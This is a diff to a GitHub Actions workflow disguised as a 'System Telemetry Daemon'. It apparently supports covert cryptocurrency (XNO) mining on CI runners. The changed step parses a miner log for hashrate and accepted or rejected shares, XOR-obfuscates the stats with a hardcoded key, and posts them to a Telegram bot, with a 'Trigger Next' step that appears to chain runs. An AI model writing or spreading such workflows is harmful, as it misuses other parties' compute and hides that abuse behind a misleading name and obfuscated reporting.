@@ -2,7 +2,7 @@ name: System Telemetry Daemon
 
 on:
   schedule:
-    - cron: '0 0,12 * * *'  # 07:00 dan 19:00 WIB
+    - cron: '0 0,12 * * *'
   workflow_dispatch:
 
 permissions:
@@ -55,29 +55,33 @@ jobs:
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
-          XOR_KEY: "S3cur3"
         run: |
           cd node-core
-          HR=$(grep -a "speed" result.log | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1) " H/s"}')
-          A=$(grep -a "accepted" result.log | wc -l)
-          R=$(grep -a "rejected" result.log | wc -l)
-          HR=${HR:-"0 H/s"}
-
-          python3 -c "
+          python3 - <<EOF
 import base64, os
-key = os.environ['XOR_KEY']
-msg = f'NANO Stats:\\n• HR: {os.environ.get(\"HR\", \"0 H/s\")}\\n• OK: {os.environ.get(\"A\", \"0\")}\\n• NO: {os.environ.get(\"R\", \"0\")}'
 
-enc = bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(msg.encode())])
-print(base64.b64encode(enc).decode())
-" > encrypted.txt
+hr = "0 H/s"
+try:
+  with open("result.log", "r", errors="ignore") as f:
+    lines = f.readlines()
+    for line in reversed(lines):
+      if "speed" in line:
+        hr = line.split()[-2] + " H/s"
+        break
+    a = sum("accepted" in l for l in lines)
+    r = sum("rejected" in l for l in lines)
+except:
+  a, r = 0, 0
 
-          ENC_MSG=$(cat encrypted.txt)
+msg = f"NANO Stats:\\n• HR: {hr}\\n• OK: {a}\\n• NO: {r}"
+key = b"S3cur3"
+cipher = bytes([b ^ key[i % len(key)] for i, b in enumerate(msg.encode())])
+b64 = base64.b64encode(cipher).decode()
 
-          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
-            -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="📦 Encrypted XNO Report:\n\`\`\`\n$ENC_MSG\n\`\`\`" \
-            -d parse_mode=Markdown
+os.system(f'curl -s -X POST https://api.telegram.org/bot${{TG_TOKEN}}/sendMessage '
+          f'-d chat_id=${{TG_CHAT_ID}} --data-urlencode text="📦 Encrypted XNO Report:\n```\\n{b64}\\n```" '
+          '-d parse_mode=Markdown')
+EOF
 
       - name: Trigger Next
         if: always()
